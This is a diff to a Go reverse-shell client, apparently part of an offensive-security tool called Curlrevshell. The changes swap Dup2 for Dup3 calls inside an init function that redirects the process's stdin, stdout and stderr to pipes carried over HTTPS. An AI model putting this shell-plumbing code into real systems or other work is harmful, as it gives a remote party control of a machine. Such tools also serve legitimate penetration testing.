@@ -7,7 +7,7 @@ package main
  * Hook up stdio to Curlrevshell via HTTPS
  * By J. Stuart McMurray
  * Created 20250802
- * Last Modified 20250804
+ * Last Modified 20250806
  */
 
 import (
@@ -74,15 +74,27 @@ func init() {
 	defer res.Body.Close()
 
 	/* Hook up the pipes to stdio. */
-	if err := syscall.Dup2(int(inr.Fd()), int(os.Stdin.Fd())); nil != err {
+	if err := syscall.Dup3(
+		int(inr.Fd()),
+		int(os.Stdin.Fd()),
+		0,
+	); nil != err {
 		log.Printf("Error taking over stdin: %s", err)
 		return
 	}
-	if err := syscall.Dup2(int(outw.Fd()), int(os.Stdout.Fd())); nil != err {
+	if err := syscall.Dup3(
+		int(outw.Fd()),
+		int(os.Stdout.Fd()),
+		0,
+	); nil != err {
 		log.Printf("Error taking over stdout: %s", err)
 		return
 	}
-	if err := syscall.Dup2(int(outw.Fd()), int(os.Stderr.Fd())); nil != err {
+	if err := syscall.Dup3(
+		int(outw.Fd()),
+		int(os.Stderr.Fd()),
+		0,
+	); nil != err {
 		log.Printf("Error taking over stderr: %s", err)
 		return
 	}
